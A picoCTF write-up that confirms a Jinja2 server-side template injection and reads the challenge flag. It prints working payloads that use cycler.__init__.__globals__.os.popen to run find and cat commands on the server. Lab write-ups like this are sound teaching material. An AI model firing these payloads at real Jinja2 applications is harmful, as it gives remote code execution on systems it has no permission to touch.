## 🔍 Challenge Overview

We're given a web application that allows users to submit announcements. Based on the behavior of the input rendering, this challenge hints at a possible **Server-Side Template Injection (SSTI)** vulnerability.

When we input:

```

{{7\*7}}

```

The rendered output displays:

```

49

````

This confirms **Jinja2 SSTI**, as Jinja2 evaluates expressions inside double curly braces.

## 🔥 Exploiting SSTI for Remote Code Execution

In Jinja2, we can access Python built-ins and even execute system commands by abusing template internals.

## 🧪 Initial Exploration – Finding the Flag

Before directly reading the flag, we confirmed it exists and located it using the following SSTI payload:

```jinja
{{cycler.__init__.__globals__.os.popen('find / -type f -iname "*flag*" 2>/dev/null').read()}}
````

This executed the `find` command on the server, and the output revealed the flag file at:

```bash
/challenge/flag
```

---

## 🔥 Exploiting SSTI to Read the Flag

Now that we know the flag's location, we use the following payload to read its contents:

```jinja
{{cycler.__init__.__globals__.os.popen('cat /challenge/flag').read()}}
```

This works by accessing Python's `os` module through Jinja2 internals and executing the `cat` command to reveal the flag.

## 🏁 Flag

```
picoCTF{<REDACTED>}

## 💡 Takeaways

* Jinja2 SSTI is a common and powerful vulnerability.
* If expressions like `{{7*7}}` are evaluated, always test for further template injection possibilities.
* SSTI can lead to full **remote code execution** if not properly sandboxed.
